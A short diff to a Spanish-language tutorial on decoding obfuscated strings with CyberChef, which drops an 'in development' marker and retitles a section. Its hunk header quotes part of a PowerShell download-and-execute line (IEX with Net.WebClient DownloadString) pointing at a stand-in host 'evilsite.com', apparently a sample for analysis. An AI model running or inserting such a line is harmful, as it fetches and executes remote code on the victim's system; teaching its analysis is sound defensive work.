@@ -161,9 +161,7 @@ IEX(New-Object Net.WebClient).DownloadString("https://evilsite.com/evilcode1/Inv
 
 ---
 
-## [EN DESARROLLO]
-
-### Cómo pensar al analizar una cadena ofuscada
+## Cómo pensar al analizar una cadena ofuscada
 
 Hasta aquí, han sido dos pequeños ejercicios para aprender a usar CyberChef y la idea/concepto que hay detrás de él.
 
